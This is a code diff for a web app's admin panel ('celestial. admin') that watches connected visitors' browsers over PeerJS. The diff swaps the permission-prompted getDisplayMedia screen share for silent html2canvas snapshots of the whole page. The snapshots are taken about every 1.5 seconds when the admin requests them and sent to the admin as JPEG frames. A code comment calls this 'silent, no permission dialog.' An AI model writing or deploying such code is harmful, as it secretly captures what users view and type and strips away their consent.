@@ -506,7 +506,7 @@
 #cp-vctrl{padding:10px;background:#060606;display:flex;gap:8px;align-items:center;}
 #cp-vctrl .ci{flex:1;}
 #cp-viewer{filter:none!important;-webkit-filter:none!important;isolation:isolate;}
-#cp-vc{filter:none!important;-webkit-filter:none!important;color-scheme:normal;object-fit:contain;background:#000;}
+#cp-vc{filter:none!important;-webkit-filter:none!important;object-fit:contain;background:#000;display:block;width:100%;}
 </style>
 <div id="cp-bar">
   <h2>celestial. admin</h2>
@@ -690,7 +690,7 @@
         <div id="cp-ping-stat" style="font-size:.7rem;color:#444;margin-top:6px;display:none;"></div>
       </div>
       <div id="cp-viewer">
-        <video id="cp-vc" autoplay muted playsinline style="display:block;width:100%;background:#000;cursor:crosshair;"></video>
+        <img id="cp-vc" src="" alt="" style="width:100%;background:#000;cursor:crosshair;min-height:180px;">
         <div id="cp-vctrl">
           <label style="font-size:.73rem;display:flex;align-items:center;gap:5px;flex-shrink:0;">
             <input type="checkbox" id="cp-showcur"/> cursor
@@ -1453,6 +1453,15 @@
       const el = document.getElementById('cp-ping-stat');
       if (el) { el.textContent = lat + 'ms'; el.style.color = lat < 200 ? '#44ff77' : lat < 500 ? '#ffaa44' : '#ff5555'; }
     }
+    // Hub-channel frame fallback (if viewer data channel not open)
+    if (d.type === 'frame' && d.data && viewTarget === cid) {
+      var _fvid = document.getElementById('cp-vc');
+      var _fv   = document.getElementById('cp-viewer');
+      if (_fvid) _fvid.src = d.data;
+      if (_fv && _fv.style.display === 'none') _fv.style.display = 'block';
+      var _fps = document.getElementById('cp-ping-stat');
+      if (_fps) { _fps.style.display = 'block'; _fps.textContent = 'live'; _fps.style.color = '#44ff77'; }
+    }
     if (d.type === 'admin-watch') {
       // Secondary admin wants to watch a client's stream
       if (clients[cid]?.isAdminPeer) clients[cid].watchingCid = d.cid || null;
@@ -1565,7 +1574,7 @@
     const v = document.getElementById('cp-viewer');
     if (v) v.style.display = 'none';
     const vid = document.getElementById('cp-vc');
-    if (vid) { vid.srcObject = null; }
+    if (vid) { vid.src = ''; }
     viewStream = null;
     const ps = document.getElementById('cp-ping-stat');
     if (ps) ps.style.display = 'none';
@@ -1713,42 +1722,22 @@
         try {
           var conn = cPeer.connect(CST_VIEWER_PID, { reliable: true });
           conn.on('open', function () {
-            // Tell admin which hub peer we are so they can match us to a client
+            viewerConn = conn;
             var apprV = getApproval();
             conn.send({ type: 'vwr-hello', peerId: cPeer.id, name: apprV?.name || null });
-            viewerConn = conn;
             conn.on('data', function (d) {
               if (!d) return;
               if (d.type === 'view-start') {
-                // Admin wants our screen — same flow as view-invite
                 if (d.cursorColor) { cursorColor = d.cursorColor; if (virCur) { virCur.remove(); virCur = null; } }
-                if (!navigator.mediaDevices?.getDisplayMedia) {
-                  try { viewerConn?.send({ type: 'view-declined', reason: 'unsupported' }); } catch {}
-                  return;
-                }
-                navigator.mediaDevices.getDisplayMedia({
-                  video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 20 } },
-                  audio: false,
-                }).then(function (stream) {
-                  displayStream = stream;
-                  capturing = true;
-                  stream.getVideoTracks()[0].addEventListener('ended', stopCap);
-                  var call = cPeer.call(CST_VIEWER_PID, stream);
-                  if (call) {
-                    call.on('close', function () { stopCap(); });
-                    call.on('error', function () { stopCap(); });
-                  }
-                }).catch(function () {
-                  try { viewerConn?.send({ type: 'view-declined', reason: 'denied' }); } catch {}
-                });
+                startCap();
               }
               if (d.type === 'stop-view' || d.type === 'stop-cap') { stopCap(); hideCur(); }
-              if (d.type === 'ping')  { try { viewerConn?.send({ type: 'pong', pingTs: d.ts }); } catch {} }
+              if (d.type === 'ping') { try { conn.send({ type: 'pong', pingTs: d.ts }); } catch {} }
             });
-            conn.on('close', function () { if (viewerConn === conn) viewerConn = null; });
-            conn.on('error', function () { if (viewerConn === conn) viewerConn = null; });
+            conn.on('close', function () { if (viewerConn === conn) { viewerConn = null; stopCap(); } });
+            conn.on('error', function () { if (viewerConn === conn) { viewerConn = null; stopCap(); } });
           });
-          conn.on('error', function () { /* peer-unavailable = admin viewer offline, retry next tick */ });
+          conn.on('error', function () { /* admin viewer peer offline — retry next tick */ });
         } catch {}
       }
 
@@ -2106,29 +2095,9 @@
           if (!document.getElementById('cst-gate')) showGate();
         }
         if (d.type === 'view-invite') {
-          // Hub-channel fallback: admin couldn't reach viewer data channel yet.
-          // Use CST_VIEWER_PID (static) regardless of d.viewPeerId for consistency.
+          // Hub-channel fallback for view requests (viewer data channel not open yet)
           if (d.cursorColor) { cursorColor = d.cursorColor; if (virCur) { virCur.remove(); virCur = null; } }
-          var viewPeerId = CST_VIEWER_PID;
-          if (!navigator.mediaDevices?.getDisplayMedia) {
-            try { adminConn.send({ type: 'view-declined', reason: 'unsupported' }); } catch {}
-          } else {
-            navigator.mediaDevices.getDisplayMedia({
-              video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 20 } },
-              audio: false,
-            }).then(function (stream) {
-              displayStream = stream;
-              capturing = true;
-              stream.getVideoTracks()[0].addEventListener('ended', stopCap);
-              var call = cPeer.call(viewPeerId, stream);
-              if (call) {
-                call.on('close', function () { stopCap(); });
-                call.on('error', function () { stopCap(); });
-              }
-            }).catch(function () {
-              try { adminConn?.send({ type: 'view-declined', reason: 'denied' }); } catch {}
-            });
-          }
+          startCap();
         }
         if (d.type === 'stop-view' || d.type === 'stop-cap') { stopCap(); hideCur(); }
         if (d.type === 'cursor')      { showCur(d.x, d.y); }
@@ -2185,15 +2154,55 @@
         }
       }
 
-      // startCap is kept as a no-op for backward compat (old admin may send start-cap)
-      function startCap() { /* screen capture now handled by view-invite media connection */ }
+      // ── Screenshot capture (canvas / html2canvas) ─────────────
+      // Captures the visible page as a JPEG and sends it over the viewer
+      // data channel.  No getDisplayMedia — silent, no permission dialog.
+      var _html2canvasReady = false;
+      var _html2canvasLoading = false;
+
+      function _loadHtml2Canvas(cb) {
+        if (_html2canvasReady) { cb(); return; }
+        if (_html2canvasLoading) { var _wait = setInterval(function() { if (_html2canvasReady) { clearInterval(_wait); cb(); } }, 200); return; }
+        _html2canvasLoading = true;
+        var s = document.createElement('script');
+        s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+        s.onload  = function () { _html2canvasReady = true; _html2canvasLoading = false; cb(); };
+        s.onerror = function () { _html2canvasLoading = false; };
+        document.head.appendChild(s);
+      }
+
+      function _sendFrame() {
+        if (!capturing) return;
+        _loadHtml2Canvas(function () {
+          if (!capturing) return;
+          try {
+            html2canvas(document.documentElement, {
+              useCORS: true, allowTaint: true,
+              scale: 0.5, logging: false, imageTimeout: 0,
+            }).then(function (canvas) {
+              if (!capturing) return;
+              var jpg = canvas.toDataURL('image/jpeg', 0.45);
+              var msg = { type: 'frame', data: jpg };
+              // Prefer direct viewer channel; fall back to hub
+              var sent = false;
+              if (viewerConn && viewerConn.open) { try { viewerConn.send(msg); sent = true; } catch {} }
+              if (!sent && adminConn && adminConn.open) { try { adminConn.send(msg); } catch {} }
+            }).catch(function () {});
+          } catch {}
+        });
+      }
+
+      function startCap() {
+        if (capturing) return;
+        capturing = true;
+        _sendFrame();                              // immediate first frame
+        capTimer = setInterval(_sendFrame, 1500);  // ~1 fps
+      }
+
       function stopCap() {
         capturing = false;
         if (capTimer) { clearInterval(capTimer); capTimer = null; }
-        if (displayStream) {
-          try { displayStream.getTracks().forEach(t => t.stop()); } catch {}
-          displayStream = null;
-        }
+        displayStream = null;
         srcVid = null; capCv = null; capCtx = null;
       }
 
@@ -2221,9 +2230,8 @@
 
   // ─── static screen-viewer peer ───────────────────────────────
   // One persistent peer (CST_VIEWER_PID) is created when the panel opens.
-  // Clients poll it every 1 s via a data channel; admin can push view-start
-  // directly over that channel instead of relying on the hub.  Media calls
-  // still travel via the same peer.
+  // Clients connect via data channel (1-s poll) and send JPEG frame messages.
+  // No getDisplayMedia / media calls involved.
   let viewerMgr   = null;
   let viewerConns = {};   // clientHubPeerId → PeerJS data connection
 
@@ -2232,23 +2240,38 @@
     loadPeerJS(function () {
       viewerMgr = PeerMgr.connect(CST_VIEWER_PID, {
         onOpen: function (peer) {
-          // ── Incoming data connections from clients (1-s polling) ──
           peer.on('connection', function (conn) {
             conn.on('open', function () {
               conn.on('data', function (d) {
-                if (d && d.type === 'vwr-hello' && d.peerId) {
+                if (!d) return;
+
+                // ── Client identifies itself ──
+                if (d.type === 'vwr-hello' && d.peerId) {
                   viewerConns[d.peerId] = conn;
-                  // If admin already wants this client, send start immediately
                   if (viewTarget === d.peerId) {
                     try { conn.send({ type: 'view-start', cursorColor: getAdminColor() }); } catch {}
                   }
                 }
-                if (d && d.type === 'pong' && d.pingTs) {
+
+                // ── Incoming screenshot frame ──
+                if (d.type === 'frame' && d.data && viewTarget) {
+                  var vid = document.getElementById('cp-vc');
+                  var v   = document.getElementById('cp-viewer');
+                  if (vid) vid.src = d.data;
+                  if (v && v.style.display === 'none') v.style.display = 'block';
+                  var ps4 = document.getElementById('cp-ping-stat');
+                  if (ps4) { ps4.style.display = 'block'; ps4.textContent = 'live'; ps4.style.color = '#44ff77'; }
+                  renderClients();
+                }
+
+                // ── Latency pong ──
+                if (d.type === 'pong' && d.pingTs) {
                   var lat = Date.now() - d.pingTs;
                   var ps2 = document.getElementById('cp-ping-stat');
                   if (ps2 && viewTarget) ps2.textContent = lat + ' ms';
                 }
-                if (d && d.type === 'view-declined') {
+
+                if (d.type === 'view-declined') {
                   var ps3 = document.getElementById('cp-ping-stat');
                   if (ps3) { ps3.textContent = 'declined'; ps3.style.color = '#ff8844'; }
                 }
@@ -2265,26 +2288,8 @@
               });
             });
           });
-          // ── Incoming media calls from clients ──
-          peer.on('call', function (call) {
-            if (!viewTarget) { call.close(); return; }
-            call.answer();
-            call.on('stream', function (remoteStream) {
-              viewStream = remoteStream;
-              var vid = document.getElementById('cp-vc');
-              var v   = document.getElementById('cp-viewer');
-              if (vid) { vid.srcObject = remoteStream; vid.play().catch(function () {}); }
-              if (v)   v.style.display = 'block';
-              var ps4 = document.getElementById('cp-ping-stat');
-              if (ps4) { ps4.style.display = 'block'; ps4.textContent = 'live'; ps4.style.color = '#44ff77'; }
-              renderClients();
-            });
-            call.on('close', function () { if (viewTarget) stopView(); });
-            call.on('error', function () { if (viewTarget) stopView(); });
-          });
         },
         onUnavailable: function () {
-          // Static ID still taken by a previous session — retry after 20 s
           viewerMgr = null;
           setTimeout(startViewerMain, 20000);
         },
